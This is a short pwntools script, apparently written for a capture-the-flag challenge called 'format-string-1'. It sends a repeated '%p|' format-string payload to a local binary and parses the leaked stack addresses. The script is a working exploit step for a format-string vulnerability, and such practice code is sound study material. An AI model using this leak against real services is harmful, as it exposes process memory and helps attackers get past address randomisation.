#!/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level = "error"
# elf = ELF("./format-string-1")
# p= process("./format-string-1")

def get_leaked_addr(n: int=100):
    p = process("./format-string-1")
    p.sendline(b"%p|"*n)
    leaked_addr = p.recvall().decode('latin-1').split(":")[-1].strip()
    leaked_addr = leaked_addr.split("|")[: -1]
    return leaked_addr

if __name__ == "__main__":
    n = input("Enter the no. of addresses to leak (default = 100): ")
    try:
        n = int(n)
    except Exception as e:
        print("Please input a number")
        n = 100
    addr = get_leaked_addr(int(n))
    print(addr)
